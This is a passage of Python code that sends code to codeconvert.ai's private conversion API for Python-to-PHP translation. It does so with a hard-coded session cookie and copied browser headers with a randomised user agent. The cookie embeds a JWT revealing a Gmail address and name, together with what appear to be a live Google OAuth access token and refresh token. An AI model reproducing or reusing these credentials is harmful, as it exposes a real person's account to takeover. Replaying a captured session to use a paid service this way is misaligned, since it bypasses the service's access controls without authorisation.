    'sb-onhboonczrurnqkehxvq-auth-token': '%5B%22eyJhbGciOiJIUzI1NiIsImtpZCI6IkdhZ2VHNGZsU3VLZEVmKzQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzE3ODUxMjQzLCJpYXQiOjE3MTc4NDc2NDMsImlzcyI6Imh0dHBzOi8vb25oYm9vbmN6cnVybnFrZWh4dnEuc3VwYWJhc2UuY28vYXV0aC92MSIsInN1YiI6IjU5M2Y2ZjAyLTk4OTQtNDA4Mi04M2I0LWNlYzdmNjU2ZjMxOSIsImVtYWlsIjoiZmNvZHppbGxhQGdtYWlsLmNvbSIsInBob25lIjoiIiwiYXBwX21ldGFkYXRhIjp7InByb3ZpZGVyIjoiZ29vZ2xlIiwicHJvdmlkZXJzIjpbImdvb2dsZSJdfSwidXNlcl9tZXRhZGF0YSI6eyJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTGtBSW85Y2FUX0R4Y0xRalk2WmFGOC1QcUtsMmJWUEVrOGJYb3VsdlRXdkU0bnJnPXM5Ni1jIiwiZW1haWwiOiJmY29kemlsbGFAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZ1bGxfbmFtZSI6Ikh2aGJiIEJCdmhqYnYiLCJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYW1lIjoiSHZoYmIgQkJ2aGpidiIsInBob25lX3ZlcmlmaWVkIjpmYWxzZSwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0xrQUlvOWNhVF9EeGNMUWpZNlphRjgtUHFLbDJiVlBFazhiWG91bHZUV3ZFNG5yZz1zOTYtYyIsInByb3ZpZGVyX2lkIjoiMTA2NTU5MDUzNjI0NzI0MjQ0NTAwIiwic3ViIjoiMTA2NTU5MDUzNjI0NzI0MjQ0NTAwIn0sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoib2F1dGgiLCJ0aW1lc3RhbXAiOjE3MTc4NDc2NDN9XSwic2Vzc2lvbl9pZCI6ImM2ODFlOWIyLTkzNzItNGY3MC04MzA3LTI2NDJhYWQzNDcwMiIsImlzX2Fub255bW91cyI6ZmFsc2V9.N29m7pHvtN_ySVTh_BsJbYjyqaIynUseE3X-zfWna6Y%22%2C%221IHvVVIJ_oVzk3mp6e3HLA%22%2C%22ya29.a0AXooCguo8vRBuLYWnLeP7Axq2WWql86cpXUvTyjJCY3TS94UR5dejg1znERUPDLb7lQCWeG7L_WIdZjOCdvWv0wB7rsCpbLl3fHDNfYspBH-W3GQlHdLTGmzZKyXJcgdyknnElP00e-MDDjXuc0dNY4-wgd4Lq6HNFyAaCgYKAQUSARMSFQHGX2MiKCT0ezogKC7wkelRx2jrzg0171%22%2C%221%2F%2F05BUbGXFMnV__CgYIARAAGAUSNwF-L9IrP72qCYEf8k-Jx-p3zf0XWTnnK6Kz0YuFyllRmGVfdT10KrOsZot4IdEzFZ9YS2yLLFs%22%2Cnull%5D',
}
		headers = {
    'authority': 'www.codeconvert.ai',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.codeconvert.ai',
    'referer': 'https://www.codeconvert.ai/app',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent.generate_user_agent(),
}
		json_data = {
    'inputCodeText': code,
    'inputLang': 'Python',
    'outputLang': 'PHP',
    'creditsUsed': 1,
    'subscriptionVariant': None,
    'customInstruction': '',
}
		response = requests.post('https://www.codeconvert.ai/api/convert', cookies=cookies, headers=headers, json=json_data)
		result = (response.json()['outputCodeText'])
		return result